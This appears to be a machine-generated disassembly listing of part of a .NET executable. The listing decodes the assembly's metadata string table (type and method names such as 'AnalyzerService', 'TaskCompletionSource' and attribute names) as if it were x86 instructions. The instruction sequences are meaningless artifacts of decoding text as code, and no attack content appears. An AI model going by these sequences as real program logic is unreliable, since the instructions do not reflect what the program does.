  402de0:	lahf   
  402de1:	or     eax,DWORD PTR [eax]
  402de3:	add    al,0x61
  402de5:	add    bl,bl
  402de7:	or     eax,DWORD PTR [esi]
  402de9:	add    al,0x24
  402deb:	add    ch,bh
  402ded:	or     ebx,DWORD PTR [edx]
  402def:	add    al,0x2c
  402df1:	add    BYTE PTR [ebp-0x46fbd2f6],bh
  402df7:	add    DWORD PTR ds:0x8904320c,esi
  402dfd:	add    bl,BYTE PTR [esi+0xc]
  402e00:	cmp    BYTE PTR [ecx+ebp*2],al
  402e03:	add    BYTE PTR [edi+0xc],ah
  402e06:	cmp    BYTE PTR [ecx+ebp*2],al
  402e09:	add    BYTE PTR [ebx],cl
  402e0b:	add    esi,DWORD PTR [edi]
  402e0d:	add    BYTE PTR [ecx+0x0],ch
  402e10:	fld    DWORD PTR [edx]
  402e12:	aaa    
  402e13:	add    BYTE PTR [ecx-0x77fdc6fe],bl
  402e19:	add    BYTE PTR [ecx+0x6f0cb101],bh
  402e1f:	add    al,0x81
  402e21:	add    BYTE PTR [edi-0x7eff92f4],bh
  402e27:	add    BYTE PTR [edx+0x3],cl
  402e2a:	jae    0x402e2c
  402e2c:	add    DWORD PTR [eax],0x7a0370
  402e32:	add    DWORD PTR [eax],0x81037e
  402e38:	add    BYTE PTR cs:[ebx+0x0],cl
  402e3c:	and    DWORD PTR ds:0xb002e,eax
  402e42:	js     0x402e48
  402e44:	add    BYTE PTR cs:[ebx],dl
  402e47:	add    BYTE PTR [edi+0x1b002e04],bh
  402e4d:	add    BYTE PTR [edi+0x23002e04],bh
  402e53:	add    ch,al
  402e55:	add    al,0x2e
  402e57:	add    BYTE PTR [ebx],ch
  402e59:	add    ch,al
  402e5b:	add    al,0x2e
  402e5d:	add    BYTE PTR [ebx],dh
  402e5f:	add    ch,al
  402e61:	add    al,0x2e
  402e63:	add    BYTE PTR [ebx],bh
  402e65:	add    al,ah
  402e67:	add    al,0x2e
  402e69:	add    BYTE PTR [ebx+0x0],al
  402e6c:	sti    
  402e6d:	add    al,0x2e
  402e6f:	add    BYTE PTR [ebx+0x0],bh
  402e72:	add    BYTE PTR ds:0xa3002e,0x23
  402e79:	or     DWORD PTR [esi],ebp
  402e7b:	add    BYTE PTR [ebx+0x0],ah
  402e7e:	push   ebp
  402e7f:	add    eax,0x6b002e
  402e84:	addr16 add eax,0x73002e
  402e8a:	jne    0x402e91
  402e8c:	add    BYTE PTR cs:[ebx+0x0],bl
  402e90:	push   ebp
  402e91:	add    eax,0x83002e
  402e96:	xchg   BYTE PTR ds:0x8b002e,al
  402e9c:	mov    cl,0x5
  402e9e:	add    BYTE PTR cs:[ebx+0x2e08fb00],dl
  402ea5:	add    BYTE PTR [ebx+0x63091a00],bl
  402eab:	add    bl,ah
  402ead:	add    DWORD PTR [eax],edi
  402eaf:	add    dh,BYTE PTR [ebx+0x2b01f101]
  402eb5:	add    bh,BYTE PTR [esp+eax*1]
  402eb8:	pop    ebx
  402eb9:	add    al,0x3
  402ebb:	add    BYTE PTR [ecx],al
  402ebd:	add    BYTE PTR [eax],al
  402ebf:	add    BYTE PTR [edx],dl
  402ec1:	add    ebx,DWORD PTR [esi+0x0]
  402ec4:	add    al,BYTE PTR [eax]
  402ec6:	pop    es
  402ec7:	add    BYTE PTR [ebx],al
  402ec9:	add    BYTE PTR [ebx],dl
  402ecb:	add    BYTE PTR [ebx+eax*1+0x41103f0],cl
  402ed2:	and    al,0x4
  402ed4:	add    al,0x80
  402ed6:	add    BYTE PTR [eax],al
  402ed8:	or     eax,DWORD PTR [eax]
  402eda:	add    BYTE PTR [eax],al
  402edc:	add    BYTE PTR [eax],al
  402ede:	add    BYTE PTR [eax],al
  402ee0:	add    DWORD PTR [eax],eax
  402ee2:	add    BYTE PTR [eax],al
  402ee4:	lahf   
  402ee5:	add    ch,al
  402ee7:	push   es
  402ee8:	add    BYTE PTR [eax],al
  402eea:	add    al,0x0
	...
  402ef4:	add    BYTE PTR [eax],al
  402ef6:	add    DWORD PTR [eax],eax
  402ef8:	mov    DWORD PTR [eax],0x0
  402efe:	or     eax,DWORD PTR [eax]
	...
  402f08:	add    BYTE PTR [eax],al
  402f0a:	or     al,BYTE PTR [eax]
  402f0c:	fiadd  WORD PTR [eax]
  402f0e:	add    BYTE PTR [eax],al
  402f10:	add    BYTE PTR [eax],al
  402f12:	add    al,0x0
	...
  402f1c:	add    BYTE PTR [eax],al
  402f1e:	add    DWORD PTR [eax],eax
  402f20:	rol    BYTE PTR [eax],1
  402f22:	add    BYTE PTR [eax],al
  402f24:	add    BYTE PTR [eax],al
  402f26:	add    al,0x0
	...
  402f30:	add    BYTE PTR [eax],al
  402f32:	add    DWORD PTR [eax],eax
  402f34:	call   0x402f3f
  402f39:	add    BYTE PTR [ecx-0x70fc4d00],cl
  402f3f:	add    bh,bl
  402f41:	add    eax,DWORD PTR [eax]
  402f43:	add    BYTE PTR [eax],al
  402f45:	cmp    al,0x4d
  402f47:	outs   dx,DWORD PTR ds:[esi]
  402f48:	fs jne 0x402fb7
  402f4b:	gs add BYTE PTR ds:[ebx+0x56],al
  402f50:	inc    ecx
  402f51:	outs   dx,BYTE PTR ds:[esi]
  402f52:	popa   
  402f53:	ins    BYTE PTR es:[edi],dx
  402f54:	jns    0x402fc9
  402f56:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  402f5d:	arpl   WORD PTR [ebp+0x2e],sp
  402f60:	gs js  0x402fc8
  402f63:	add    BYTE PTR [ecx+0x6e],al
  402f66:	popa   
  402f67:	ins    BYTE PTR es:[edi],dx
  402f68:	jns    0x402fdd
  402f6a:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  402f71:	arpl   WORD PTR [ebp+0x41],sp
  402f74:	jo     0x402fe6
  402f76:	add    BYTE PTR [ebp+0x69],cl
  402f79:	arpl   WORD PTR [edx+0x6f],si
  402f7c:	jae    0x402fed
  402f7e:	data16 je 0x402faf
  402f81:	inc    ebx
  402f82:	outs   dx,DWORD PTR ds:[esi]
  402f83:	outs   dx,BYTE PTR ds:[esi]
  402f84:	arpl   WORD PTR [ebp+0x72],si
  402f87:	jb     0x402fee
  402f89:	outs   dx,BYTE PTR ds:[esi]
  402f8a:	arpl   WORD PTR [ecx+0x56],di
  402f8d:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  402f94:	gs jb  0x402fc5
  402f97:	inc    ecx
  402f98:	outs   dx,BYTE PTR ds:[esi]
  402f99:	popa   
  402f9a:	ins    BYTE PTR es:[edi],dx
  402f9b:	jns    0x403010
  402f9d:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  402fa4:	arpl   WORD PTR [ebp+0x0],sp
  402fa7:	inc    ecx
  402fa8:	outs   dx,BYTE PTR ds:[esi]
  402fa9:	popa   
  402faa:	ins    BYTE PTR es:[edi],dx
  402fab:	jns    0x403020
  402fad:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  402fb4:	arpl   WORD PTR [ebp+0x0],sp
  402fb7:	inc    ecx
  402fb8:	outs   dx,BYTE PTR ds:[esi]
  402fb9:	popa   
  402fba:	ins    BYTE PTR es:[edi],dx
  402fbb:	jns    0x403030
  402fbd:	imul   esi,DWORD PTR [ebx+0x50],0x72676f72
  402fc4:	gs jae 0x40303a
  402fc7:	inc    ecx
  402fc8:	fs popa 
  402fca:	jo     0x403040
  402fcc:	gs jb  0x402fcf
  402fcf:	inc    ecx
  402fd0:	outs   dx,BYTE PTR ds:[esi]
  402fd1:	popa   
  402fd2:	ins    BYTE PTR es:[edi],dx
  402fd3:	jns    0x403048
  402fd5:	imul   esi,DWORD PTR [ebx+0x4e],0x506e6567
  402fdc:	bound  edx,QWORD PTR fs:[edx+0x65]
  402fe0:	jno    0x403057
  402fe2:	gs jae 0x403059
  402fe5:	gs jb  0x403029
  402fe8:	fs popa 
  402fea:	jo     0x403060
  402fec:	gs jb  0x402fef
  402fef:	inc    ecx
  402ff0:	outs   dx,BYTE PTR ds:[esi]
  402ff1:	popa   
  402ff2:	ins    BYTE PTR es:[edi],dx
  402ff3:	jns    0x403068
  402ff5:	imul   esi,DWORD PTR [ebx+0x53],0x6f436d71
  402ffc:	ins    BYTE PTR es:[edi],dx
  402ffd:	ins    BYTE PTR es:[edi],dx
  402ffe:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  403003:	inc    ecx
  403004:	fs popa 
  403006:	jo     0x40307c
  403008:	gs jb  0x40300b
  40300b:	ins    DWORD PTR es:[edi],dx
  40300c:	jae    0x403071
  40300e:	outs   dx,DWORD PTR ds:[esi]
  40300f:	jb     0x40307d
  403011:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  403018:	gs ins DWORD PTR es:[edi],dx
  40301a:	add    BYTE PTR [edi+0x62],cl
  40301d:	push   0x65
  40301f:	arpl   WORD PTR [eax+eax*1+0x4d],si
  403023:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40302a:	je     0x40305a
  40302c:	inc    ebx
  40302d:	outs   dx,DWORD PTR ds:[esi]
  40302e:	outs   dx,BYTE PTR ds:[esi]
  40302f:	arpl   WORD PTR [ebp+0x72],si
  403032:	jb     0x403099
  403034:	outs   dx,BYTE PTR ds:[esi]
  403035:	arpl   WORD PTR [ecx+0x56],di
  403038:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  40303f:	gs jb  0x403042
  403042:	dec    ebp
  403043:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40304a:	je     0x40307a
  40304c:	inc    ebx
  40304d:	outs   dx,DWORD PTR ds:[esi]
  40304e:	outs   dx,BYTE PTR ds:[esi]
  40304f:	arpl   WORD PTR [ebp+0x72],si
  403052:	jb     0x4030b9
  403054:	outs   dx,BYTE PTR ds:[esi]
  403055:	arpl   WORD PTR [ecx+0x56],di
  403058:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  40305f:	gs jb  0x403090
  403062:	inc    ebx
  403063:	outs   dx,DWORD PTR ds:[esi]
  403064:	ins    DWORD PTR es:[edi],dx
  403065:	ins    DWORD PTR es:[edi],dx
  403066:	outs   dx,DWORD PTR ds:[esi]
  403067:	outs   dx,BYTE PTR ds:[esi]
  403068:	add    BYTE PTR [ecx+0x41],cl
  40306b:	outs   dx,BYTE PTR ds:[esi]
  40306c:	popa   
  40306d:	ins    BYTE PTR es:[edi],dx
  40306e:	jns    0x4030e3
  403070:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  403077:	arpl   WORD PTR [ebp+0x0],sp
  40307a:	dec    ecx
  40307b:	inc    esp
  40307c:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  403083:	ins    BYTE PTR es:[edi],dx
  403084:	add    BYTE PTR gs:[ecx+0x50],cl
  403088:	jb     0x4030f9
  40308a:	addr16 jb 0x4030f2
  40308d:	jae    0x403102
  40308f:	pusha  
  403090:	xor    DWORD PTR [eax],eax
  403092:	push   eax
  403093:	jb     0x403104
  403095:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x5067
  40309c:	jb     0x40310d
  40309e:	addr16 jb 0x403106
  4030a1:	jae    0x403116
  4030a3:	push   eax
  4030a4:	popa   
  4030a5:	jb     0x403108
  4030a7:	ins    DWORD PTR es:[edi],dx
  4030a8:	gs je  0x403110
  4030ab:	jb     0x4030ad
  4030ad:	dec    ecx
  4030ae:	dec    esi
  4030af:	outs   dx,BYTE PTR gs:[si]
  4030b2:	push   eax
  4030b3:	bound  edx,QWORD PTR fs:[edx+0x65]
  4030b7:	jno    0x40312e
  4030b9:	gs jae 0x403130
  4030bc:	gs jb  0x4030bf
  4030bf:	dec    ecx
  4030c0:	push   ebx
  4030c1:	jno    0x403130
  4030c3:	push   esp
  4030c4:	jb     0x403127
  4030c6:	arpl   WORD PTR [ebp+0x44],sp
  4030c9:	popa   
  4030ca:	je     0x40312d
  4030cc:	inc    ebx
  4030cd:	outs   dx,DWORD PTR ds:[esi]
  4030ce:	ins    BYTE PTR es:[edi],dx
  4030cf:	ins    BYTE PTR es:[edi],dx
  4030d0:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4030d5:	add    BYTE PTR [edi+0x75],al
  4030d8:	imul   esp,DWORD PTR [eax+eax*1+0x65],0x6f70646e
  4030e0:	imul   ebp,DWORD PTR [esi+0x74],0x53006449
  4030e7:	jns    0x40315c
  4030e9:	je     0x403150
  4030eb:	ins    DWORD PTR es:[edi],dx
  4030ec:	cs inc esp
  4030ee:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4030f5:	imul   esp,DWORD PTR [ebx+0x73],0x6f725000
  4030fc:	arpl   WORD PTR [ebp+0x73],sp
  4030ff:	jae    0x403101
  403101:	jo     0x403164
  403103:	jb     0x40316a
  403105:	outs   dx,BYTE PTR ds:[esi]
  403106:	je     0x403158
  403108:	jb     0x403179
  40310a:	arpl   WORD PTR [ebp+0x73],sp
  40310d:	jae    0x40310f
  40310f:	push   ebx
  403110:	jns    0x403185
  403112:	je     0x403179
  403114:	ins    DWORD PTR es:[edi],dx
  403115:	cs push ebx
  403117:	arpl   WORD PTR gs:[ebp+0x72],si
  40311b:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6e697250
  403123:	arpl   WORD PTR [ecx+0x70],bp
  403126:	popa   
  403127:	ins    BYTE PTR es:[edi],dx
  403128:	add    BYTE PTR [ebx+0x65],dl
  40312b:	arpl   WORD PTR [ebp+0x72],si
  40312e:	imul   esi,DWORD PTR [ecx+edi*2+0x49],0x746e6564
  403136:	imul   esp,DWORD PTR [esi+0x69],0x61007265
  40313d:	jne    0x4031b3
  40313f:	push   0x7a69726f
  403144:	gs fs push ebx
  403147:	imul   esp,DWORD PTR [eax+eax*1+0x4d],0x6e6961
  40314f:	push   ebp
  403150:	jb     0x4031bb
  403152:	add    BYTE PTR [edi+0x65],al
  403155:	je     0x4031aa
  403157:	gs jb  0x4031d0
  40315a:	imul   esp,DWORD PTR [ebx+0x65],0x697255
  403161:	push   eax
  403162:	popa   
  403163:	jb     0x4031d8
  403165:	gs inc ecx
  403167:	jb     0x4031d0
  403169:	jne    0x4031d8
  40316b:	outs   dx,BYTE PTR gs:[esi]
  40316d:	je     0x4031e2
  40316f:	inc    ecx
  403170:	outs   dx,BYTE PTR ds:[esi]
  403171:	fs dec ecx
  403173:	outs   dx,BYTE PTR ds:[esi]
  403174:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40317c:	add    BYTE PTR [esi],ch
  40317e:	arpl   WORD PTR [edi+ebp*2+0x72],si
  403182:	add    BYTE PTR [ebx+0x79],dl
  403185:	jae    0x4031fb
  403187:	gs ins DWORD PTR es:[edi],dx
  403189:	cs push esp
  40318b:	push   0x64616572
  403190:	imul   ebp,DWORD PTR [esi+0x67],0x7361542e
  403197:	imul   esi,DWORD PTR [ebx+0x0],0x54
  40319b:	popa   
  40319c:	jae    0x403209
  40319e:	inc    ebx
  40319f:	outs   dx,DWORD PTR ds:[esi]
  4031a0:	ins    DWORD PTR es:[edi],dx
  4031a1:	jo     0x40320f
  4031a3:	gs je  0x40320f
  4031a6:	outs   dx,DWORD PTR ds:[esi]
  4031a7:	outs   dx,BYTE PTR ds:[esi]
  4031a8:	push   ebx
  4031a9:	outs   dx,DWORD PTR ds:[esi]
  4031aa:	jne    0x40321e
  4031ac:	arpl   WORD PTR [ebp+0x60],sp
  4031af:	xor    DWORD PTR [eax],eax
  4031b1:	push   0x4374736f
  4031b6:	outs   dx,DWORD PTR ds:[esi]
  4031b7:	ins    DWORD PTR es:[edi],dx
  4031b8:	jo     0x403226
  4031ba:	gs je  0x403226
  4031bd:	outs   dx,DWORD PTR ds:[esi]
  4031be:	outs   dx,BYTE PTR ds:[esi]
  4031bf:	push   ebx
  4031c0:	outs   dx,DWORD PTR ds:[esi]
  4031c1:	jne    0x403235
  4031c3:	arpl   WORD PTR [ebp+0x0],sp
  4031c6:	push   ebx
  4031c7:	jns    0x40323c
  4031c9:	je     0x403230
  4031cb:	ins    DWORD PTR es:[edi],dx
  4031cc:	cs push esp
  4031ce:	push   0x64616572
  4031d3:	imul   ebp,DWORD PTR [esi+0x67],0x6e614300
  4031da:	arpl   WORD PTR [ebp+0x6c],sp
  4031dd:	ins    BYTE PTR es:[edi],dx
  4031de:	popa   
  4031df:	je     0x40324a
  4031e1:	outs   dx,DWORD PTR ds:[esi]
  4031e2:	outs   dx,BYTE PTR ds:[esi]
  4031e3:	push   esp
  4031e4:	outs   dx,DWORD PTR ds:[esi]
  4031e5:	imul   esp,DWORD PTR [ebp+0x6e],0x53
  4031e9:	outs   dx,DWORD PTR ds:[esi]
  4031ea:	jne    0x40325e
  4031ec:	arpl   WORD PTR [ebp+0x0],sp
  4031ef:	arpl   WORD PTR [ebx+esi*2+0x0],si
  4031f3:	imul   esi,DWORD PTR fs:[ebx+0x70],0x6465736f
  4031fb:	add    BYTE PTR [esi+0x69],al
  4031fe:	outs   dx,BYTE PTR ds:[esi]
  4031ff:	popa   
  403200:	ins    BYTE PTR es:[edi],dx
  403201:	imul   edi,DWORD PTR [edx+0x65],0x73615400
  403208:	imul   eax,DWORD PTR [eax],0x67
  40320b:	gs je  0x40326d
  40320e:	inc    ebx
  40320f:	outs   dx,DWORD PTR ds:[esi]
  403210:	ins    DWORD PTR es:[edi],dx
  403211:	jo     0x40327f
  403213:	gs je  0x40327f
  403216:	outs   dx,DWORD PTR ds:[esi]
  403217:	outs   dx,BYTE PTR ds:[esi]
  403218:	push   esp
  403219:	popa   
  40321a:	jae    0x403287
  40321c:	add    BYTE PTR [ecx+ebp*2+0x73],al
  403220:	jo     0x403291
  403222:	jae    0x403289
  403224:	add    BYTE PTR [ebx+0x74],dl
  403227:	outs   dx,DWORD PTR ds:[esi]
  403228:	jo     0x40327d
  40322a:	gs jb  0x4032a3
  40322d:	imul   esp,DWORD PTR [ebx+0x65],0x636f4c00
  403234:	popa   
  403235:	ins    BYTE PTR es:[edi],dx
  403236:	push   esp
  403237:	jb     0x40329a
  403239:	arpl   WORD PTR [ebp+0x52],sp
  40323c:	gs jo  0x4032ae
  40323f:	jb     0x4032b5
  403241:	dec    ebp
  403242:	outs   dx,DWORD PTR ds:[esi]
  403243:	fs gs ins BYTE PTR es:[edi],dx
  403246:	add    BYTE PTR [eax+0x72],dl
  403249:	outs   dx,DWORD PTR ds:[esi]
  40324a:	imul   bp,WORD PTR [ebp+eiz*2+0x0],0x6143
  403251:	outs   dx,BYTE PTR ds:[esi]
  403252:	arpl   WORD PTR [ebp+0x6c],sp
  403255:	add    BYTE PTR [ebx+0x6f],al
  403258:	ins    DWORD PTR es:[edi],dx
  403259:	jo     0x4032c7
  40325b:	gs je  0x4032c7
  40325e:	outs   dx,DWORD PTR ds:[esi]
  40325f:	outs   dx,BYTE PTR ds:[esi]
  403260:	push   esp
  403261:	popa   
  403262:	jae    0x4032cf
  403264:	add    BYTE PTR [ecx+0x41],cl
  403267:	outs   dx,BYTE PTR ds:[esi]
  403268:	popa   
  403269:	ins    BYTE PTR es:[edi],dx
  40326a:	jns    0x4032df
  40326c:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  403273:	arpl   WORD PTR [ebp+0x43],sp
  403276:	popa   
  403277:	ins    BYTE PTR es:[edi],dx
  403278:	ins    BYTE PTR es:[edi],dx
  403279:	bound  esp,QWORD PTR [ecx+0x63]
  40327c:	imul   eax,DWORD PTR [eax],0x63
  40327f:	popa   
  403280:	ins    BYTE PTR es:[edi],dx
  403281:	ins    BYTE PTR es:[edi],dx
  403282:	bound  esp,QWORD PTR [ecx+0x63]
  403285:	imul   eax,DWORD PTR [eax],0x52
  403288:	gs jo  0x4032fa
  40328b:	jb     0x403301
  40328d:	add    BYTE PTR [edi+0x65],al
  403290:	outs   dx,BYTE PTR ds:[esi]
  403291:	gs jb  0x4032f5
  403294:	je     0x4032fb
  403296:	dec    esi
  403297:	outs   dx,BYTE PTR gs:[si]
  40329a:	push   eax
  40329b:	bound  eax,QWORD PTR fs:[eax]
  40329e:	push   ebx
  40329f:	jno    0x40330e
  4032a1:	push   esp
  4032a2:	jb     0x403305
  4032a4:	arpl   WORD PTR [ebp+0x44],sp
  4032a7:	popa   
  4032a8:	je     0x40330b
  4032aa:	jo     0x40331b
  4032ac:	imul   ebp,DWORD PTR [esi+0x74],0x6d657449
  4032b3:	add    BYTE PTR [edx+0x65],dl
  4032b6:	jo     0x403327
  4032b8:	jb     0x40332e
  4032ba:	inc    edx
  4032bb:	outs   dx,DWORD PTR ds:[esi]
  4032bc:	outs   dx,DWORD PTR ds:[esi]
  4032bd:	ins    BYTE PTR es:[edi],dx
  4032be:	gs popa 
  4032c0:	outs   dx,BYTE PTR ds:[esi]
  4032c1:	add    BYTE PTR [edx+0x65],dl
  4032c4:	jo     0x403335
  4032c6:	jb     0x40333c
  4032c8:	dec    ecx
  4032c9:	outs   dx,BYTE PTR ds:[esi]
  4032ca:	je     0x403331
  4032cc:	addr16 gs jb 0x4032d0
  4032d0:	popa   
  4032d1:	jb     0x40333a
  4032d3:	jae    0x4032d5
  4032d5:	je     0x403349
  4032d7:	popa   
  4032d8:	arpl   WORD PTR [ebp+0x52],sp
  4032db:	gs jo  0x40334d
  4032de:	jb     0x403354
  4032e0:	add    BYTE PTR [edx+esi*2+0x61],dh
  4032e4:	arpl   WORD PTR [ebp+0x46],sp
  4032e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x72617400
  4032ef:	addr16 gs je 0x403343
  4032f3:	imul   esp,DWORD PTR [eax+eax*1+0x74],0x74616572
  4032fb:	push   esp
  4032fc:	jb     0x40335f
  4032fe:	arpl   WORD PTR [ebp+0x41],sp
  403301:	jae    0x40334f
  403303:	outs   dx,DWORD PTR ds:[esi]
  403304:	arpl   WORD PTR [ecx+0x6c],sp
  403307:	add    BYTE PTR [edi+0x75],ch
  40330a:	je     0x40337c
  40330c:	jne    0x403382
  40330e:	inc    esi
  40330f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x70736964
  403317:	outs   dx,DWORD PTR ds:[esi]
  403318:	jae    0x403383
  40331a:	outs   dx,BYTE PTR ds:[esi]
  40331b:	add    BYTE PTR [bx+si+0x72],dh
  40331f:	outs   dx,DWORD PTR ds:[esi]
  403320:	addr16 jb 0x403388
  403323:	jae    0x403398
  403325:	add    BYTE PTR [esi+0x61],ch
  403328:	je     0x403393
  40332a:	jbe    0x403391
  40332c:	dec    ecx
  40332d:	ins    DWORD PTR es:[edi],dx
  40332e:	popa   
  40332f:	addr16 gs inc esi
  403332:	jne    0x4033a0
  403334:	ins    BYTE PTR es:[edi],dx
  403335:	push   eax
  403336:	popa   
  403337:	je     0x4033a1
  403339:	add    BYTE PTR [eax+0x64],dh
  40333c:	bound  eax,QWORD PTR [ebp+eiz*2+0x73]
  403340:	je     0x403342
  403342:	jae    0x4033bd
  403344:	ins    DWORD PTR es:[edi],dx
  403345:	bound  ebp,QWORD PTR [edi+0x6c]
  403348:	push   eax
  403349:	popa   
  40334a:	je     0x4033b4
  40334c:	add    BYTE PTR [ecx+0x74],ch
  40334f:	gs ins DWORD PTR es:[edi],dx
  403351:	add    BYTE PTR [esi+0x61],dh
  403354:	ins    BYTE PTR es:[edi],dx
  403355:	jne    0x4033bc
  403357:	add    BYTE PTR [ebx+0x79],dl
  40335a:	jae    0x4033d0
  40335c:	gs ins DWORD PTR es:[edi],dx
  40335e:	cs push edx
  403360:	jne    0x4033d0
  403362:	je     0x4033cd
  403364:	ins    DWORD PTR es:[edi],dx
  403365:	gs cs push esi
  403368:	gs jb  0x4033de
  40336b:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  403372:	push   esp
  403373:	popa   
  403374:	jb     0x4033dd
  403376:	gs je  0x4033bf
  403379:	jb     0x4033dc
  40337b:	ins    DWORD PTR es:[edi],dx
  40337c:	gs ja  0x4033ee
  40337f:	jb     0x4033ec
  403381:	inc    ecx
  403382:	je     0x4033f8
  403384:	jb     0x4033ef
  403386:	bound  esi,QWORD PTR [ebp+0x74]
  403389:	add    BYTE PTR gs:[ebx+0x79],dl
  40338d:	jae    0x403403
  40338f:	gs ins DWORD PTR es:[edi],dx
  403391:	cs push edx
  403393:	jne    0x403403
  403395:	je     0x403400
  403397:	ins    DWORD PTR es:[edi],dx
  403398:	gs cs dec ecx
  40339b:	outs   dx,BYTE PTR ds:[esi]
  40339c:	je     0x403403
  40339e:	jb     0x40340f
  4033a0:	jo     0x4033f5
  4033a2:	gs jb  0x40341b
  4033a5:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  4033ac:	ins    DWORD PTR es:[edi],dx
  4033ad:	push   esi
  4033ae:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  4033b5:	je     0x40342b
  4033b7:	jb     0x403422
  4033b9:	bound  esi,QWORD PTR [ebp+0x74]
  4033bc:	add    BYTE PTR gs:[ebx+0x4c],al
  4033c0:	push   ebx
  4033c1:	inc    ebx
  4033c2:	outs   dx,DWORD PTR ds:[esi]
  4033c3:	ins    DWORD PTR es:[edi],dx
  4033c4:	jo     0x403432
  4033c6:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4033cd:	jb     0x403438
  4033cf:	bound  esi,QWORD PTR [ebp+0x74]
  4033d2:	add    BYTE PTR gs:[ebx+0x79],dl
  4033d6:	jae    0x40344c
  4033d8:	gs ins DWORD PTR es:[edi],dx
  4033da:	cs push edx
  4033dc:	gs data16 ins BYTE PTR es:[edi],dx
  4033df:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4033e4:	outs   dx,BYTE PTR ds:[esi]
  4033e5:	add    BYTE PTR [ecx+0x73],al
  4033e8:	jae    0x40344f
  4033ea:	ins    DWORD PTR es:[edi],dx
  4033eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4033ef:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4033f7:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4033fe:	jae    0x403473
  403400:	gs ins DWORD PTR es:[edi],dx
  403402:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  403406:	gs jae 0x40346c
  403409:	jb     0x403474
  40340b:	jo     0x403481
  40340d:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403414:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40341b:	jae    0x403490
  40341d:	gs ins DWORD PTR es:[edi],dx
  40341f:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  403423:	gs popaw 
  403426:	jne    0x403494
  403428:	je     0x40346b
  40342a:	ins    BYTE PTR es:[edi],dx
  40342b:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  403432:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403439:	jae    0x4034ae
  40343b:	gs ins DWORD PTR es:[edi],dx
  40343d:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403441:	outs   dx,DWORD PTR ds:[esi]
  403442:	ins    DWORD PTR es:[edi],dx
  403443:	jo     0x4034a6
  403445:	outs   dx,BYTE PTR ds:[esi]
  403446:	jns    0x403489
  403448:	je     0x4034be
  40344a:	jb     0x4034b5
  40344c:	bound  esi,QWORD PTR [ebp+0x74]
  40344f:	add    BYTE PTR gs:[ecx+0x73],al
  403453:	jae    0x4034ba
  403455:	ins    DWORD PTR es:[edi],dx
  403456:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  40345a:	jb     0x4034cb
  40345c:	fs jne 0x4034c2
  40345f:	je     0x4034a2
  403461:	je     0x4034d7
  403463:	jb     0x4034ce
  403465:	bound  esi,QWORD PTR [ebp+0x74]
  403468:	add    BYTE PTR gs:[ecx+0x73],al
  40346c:	jae    0x4034d3
  40346e:	ins    DWORD PTR es:[edi],dx
  40346f:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403473:	outs   dx,DWORD PTR ds:[esi]
  403474:	jo     0x4034ef
  403476:	jb     0x4034e1
  403478:	addr16 push 0x74744174
  40347e:	jb     0x4034e9
  403480:	bound  esi,QWORD PTR [ebp+0x74]
  403483:	add    BYTE PTR gs:[ecx+0x73],al
  403487:	jae    0x4034ee
  403489:	ins    DWORD PTR es:[edi],dx
  40348a:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40348e:	gs jb  0x403504
  403491:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403498:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40349f:	jae    0x403514
  4034a1:	gs ins DWORD PTR es:[edi],dx
  4034a3:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4034a7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4034af:	outs   dx,DWORD PTR ds:[esi]
  4034b0:	outs   dx,BYTE PTR ds:[esi]
  4034b1:	inc    ecx
  4034b2:	je     0x403528
  4034b4:	jb     0x40351f
  4034b6:	bound  esi,QWORD PTR [ebp+0x74]
  4034b9:	add    BYTE PTR gs:[ecx+0x73],al
  4034bd:	jae    0x403524
  4034bf:	ins    DWORD PTR es:[edi],dx
  4034c0:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4034c4:	outs   dx,BYTE PTR ds:[esi]
  4034c5:	outs   dx,WORD PTR ds:[esi]
  4034c7:	jb     0x403536
  4034c9:	popa   
  4034ca:	je     0x403535
  4034cc:	outs   dx,DWORD PTR ds:[esi]
  4034cd:	outs   dx,BYTE PTR ds:[esi]
  4034ce:	popa   
  4034cf:	ins    BYTE PTR es:[edi],dx
  4034d0:	push   esi
  4034d1:	gs jb  0x403547
  4034d4:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4034db:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  4034e2:	jns    0x403557
